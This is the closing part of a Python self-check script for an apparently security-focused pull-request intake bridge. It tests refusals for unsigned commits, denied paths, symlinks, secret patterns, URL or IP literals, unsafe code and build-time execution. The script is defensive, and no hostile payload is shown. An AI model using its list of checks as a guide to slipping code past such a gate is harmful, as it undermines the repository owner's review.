    assert result.draft["draft"] is True and result.audit["actor"] == "jack"
    stranger = FakeImport(case, actor="mallory")
    refused = bridge.import_case(case, stranger, {"check": "commits", "sha": case.head, "reason": "reviewed"})
    assert isinstance(refused.decision, bridge.Refusal) and refused.decision.code == "override", refused.decision
    assert not stranger.pushes and not stranger.forge_calls, "a non-owner actor reached the forge"


def check_dry_run_pages() -> None:
    pages = {1: [{"number": number} for number in range(100)], 2: [{"number": 100}]}
    seen = []

    class Paged:
        def github(self, method: str, path: str, payload=None):
            seen.append(path)
            return pages.get(int(path.rsplit("page=", 1)[1]), [])

    assert bridge.open_numbers(Paged()) == list(range(101))
    assert len(seen) == 2, seen


EXPECTED = {
    "stranger": "intake: allowlist: GitHub login 'stranger' is not allowed",
    "base-shape": "intake: base: PR #11636 targets octocat/Hello-World:master, expected jackmaxwil/yi:main",
    "unsigned": f"intake: signature: commit {H} has no signature verifiable by jackmaxwil's pinned keys",
    "wrong-author": f"intake: identity: commit {H} author 'other@example.invalid' or committer 'mazac@chapman.edu' is not pinned to jackmaxwil",
    "fetch-pin": f"intake: head: fetched {'0' * 40}, expected pinned {H}",
    "moved-head": f"intake: head: PR #11636 moved from {H} to {'0' * 40}; no branch pushed",
    "commits-cap-plus-one": "intake: commits: 21 exceeds per-login cap 20",
    "files-cap-plus-one": "intake: files: 41 exceeds per-login cap 40",
    "lines-cap-plus-one": "intake: lines: 4001 exceeds per-login cap 4000",
    "bytes-cap-plus-one": "intake: bytes: 150001 exceeds per-login cap 150000",
    "unmappable-base": f"intake: base: mirror merge-base {M} has no unique Forgejo mapping",
    "merge-commit": f"intake: history: merge commit {H} is not importable; rebase into linear signed commits",
    "deny-path": "intake: path: 'scripts/intake/allowed.json' is denied by scripts/intake/",
    "cargo-config": "intake: path: '.cargo/config.toml' is denied by .cargo",
    "symlink": "intake: mode: 'README' is a symlink",
    "submodule": "intake: mode: 'README' is a submodule",
    "executable": "intake: mode: 'README' changes the executable bit",
    "binary": "intake: binary: 'README' is binary",
    "lfs": "intake: lfs: 'README' is an LFS pointer",
    "rename-new-side": "intake: path: 'scripts/intake/allowed.json' is denied by scripts/intake/",
    "rename-old-side": "intake: path: 'scripts/intake/allowed.json' is denied by scripts/intake/",
    "dot-dot": "intake: filename: 'docs/../escape' fails empty, '.' or '..' component",
    "case-fold": "intake: filename: 'Readme' fails case-fold collision with 'README'",
    "secret": "intake: content: 'README:2' matches a secret/private pattern",
    "placeholder": "intake: content: 'README:2' contains a mirror replacement literal",
    "replacement": "intake: content: 'README:2' contains a mirror replacement literal",
    "url": "intake: network-literal: 'README:2' contains URL; owner review is required",
    "ip": "intake: network-literal: 'README:2' contains IP literal; owner review is required",
    "unsafe": "intake: unsafe: 'README:2' adds unsafe",
    "proc-macro": "intake: build: 'crates/probe/Cargo.toml:2' adds build-time execution proc-macro",
    "dependency-section": "intake: build: 'Cargo.toml:2' adds build-time execution dependency section",
    "dependency": "intake: dependencies: 'Cargo.toml' changes dependencies without per-login permission",
    "replaced-context": f"intake: apply: patch does not apply strictly to Forgejo base {F}: error: patch failed: README:1",
    "invalid-lens": "intake: lens unavailable: invalid lens output",
    "lens-refusal": "intake: lens: model-added refusal",
    "import-as-no-consent": "intake: import-as: contributor 'pranavjcs' has import_as without consent",
    "import-as-addressed-email": "intake: import-as: contributor 'pranavjcs' import_as email 'Maximillian Ludwick <max@example.invalid>' is not a plain address",
}


def selfcheck() -> int:
    if trouble := keygen_trouble():
        print(f"skip intake selfcheck (no host ssh-keygen can verify a commit signature: {trouble})")
        return 0
    assert len(bridge.CHECKS) == 25
    check_real_fixture()
    if missing := filter_repo_missing():
        print(missing)
    else:
        check_rewrite_helper()
    check_real_patch_edges()
    check_forged_headers()
    check_signed_object()
    valid = valid_case()
    assert bridge.evaluate(valid) == bridge.ALLOW
    check_caps()
    red = []
    with second_contributor():
        for name, check, case, code in hostile_cases():
            decision = bridge.evaluate(case)
            assert isinstance(decision, bridge.Refusal), f"{name}: expected refusal, got {decision}"
            assert decision.text.startswith(f"intake: {code}: "), decision.text
            if name in EXPECTED:
                assert decision.text == EXPECTED[name], f"{name}: {decision.text}"
            without = bridge.evaluate(case, disabled=frozenset({check}))
            assert without != decision, f"{name}: disabling {check} kept {decision.text}"
            shown = without if isinstance(without, str) else without.text
            red.append(f"{name} · disable {check}: expected {decision.text}; got {shown}")
    check_dry_run_write_detection()
    check_dry_run_pages()
    check_deleted_dependency()
    check_overrides()
    check_ordinary_text_is_allowed()
    check_mapped_import()
    check_import_as_refusals()
    check_signoff_rewrite()
    check_dry_run_prints_mapping()
    check_lens_runs_without_tools_and_repairs_prose()
    check_import_result()
    payload = bridge.draft_payload(valid)
    assert bridge.branch_name(valid) == f"gh/jackmaxwil/{valid.number}-{H[:8]}"
    assert payload["draft"] is True and payload["head"] == bridge.branch_name(valid)
    assert 'trust="untrusted"' in payload["body"]
    print("\n".join("seen-red " + line for line in red))
    print(f"ok   intake selfcheck ({len(red)} hostile cases, 25 ordered checks, real fixtures)")
    return 0


if __name__ == "__main__":
    raise SystemExit(selfcheck())
